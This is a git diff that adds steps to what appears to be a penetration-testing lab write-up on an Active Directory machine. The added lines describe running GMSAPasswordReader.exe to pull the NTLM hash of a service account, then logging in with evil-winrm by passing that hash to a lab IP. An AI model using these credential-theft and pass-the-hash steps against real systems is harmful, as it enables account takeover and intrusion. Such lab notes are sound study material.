@@ -462,10 +462,16 @@ Get-ADGroupMember 'Web Admins'
 
 ![](Pasted%20image%2020221012215548.png)
 
+#### - Downloaded the GMSAPasswordReader.exe precompiled binary to target machine
 
+#### - Typed .\GMSAPasswordReader.exe --AccountName 'svc_apache' and retreived the following  NTLM hash:
 
+![](Pasted%20image%2020221012215649.png)
 
+#### - The rc4_hmac hash is the same as the NT hash, they are interchangeable.
+#rc4_hmac
 
+#### - Typed evil-winrm -i 192.168.81.165 -u svc_apache$ -H 4283B392D3647F3F26D614EE3AB9A80C and received a winrm login session as user svc_apache$
 ---
 
 # Privilege Escalation
